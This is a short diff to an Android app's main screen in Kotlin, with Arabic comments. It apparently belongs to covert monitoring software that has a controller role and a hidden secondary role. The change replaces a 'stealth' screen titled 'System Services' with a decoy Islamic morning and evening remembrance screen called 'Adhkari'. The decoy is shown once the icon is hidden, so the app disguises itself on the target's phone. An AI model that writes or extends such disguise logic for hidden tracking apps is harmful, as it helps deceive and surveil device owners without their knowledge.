@@ -24,9 +24,9 @@ class MainActivity : AppCompatActivity() {
         when (Prefs.role(this)) {
             "main" -> { startActivity(Intent(this, WebPanelActivity::class.java)); finish(); return }
             "secondary" -> {
-                // بعد الإخفاء لا تُفتح شاشة الإعداد مباشرة — تُفتح شاشة التخفي
+                // بعد الإخفاء يظهر التطبيق في صورة «أذكاري» — شاشة أذكار الصباح والمساء
                 if (Prefs.activated(this) && Prefs.hideIcon(this)) {
-                    startActivity(Intent(this, StealthActivity::class.java))
+                    startActivity(Intent(this, AdhkarActivity::class.java))
                 } else {
                     startActivity(Intent(this, SetupActivity::class.java))
                 }
@@ -41,7 +41,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         layout.addView(TextView(this).apply {
-            text = "خدمات النظام"
+            text = "أذكاري"
             textSize = 28f
             gravity = android.view.Gravity.CENTER
             setPadding(0, pad, 0, pad / 2)
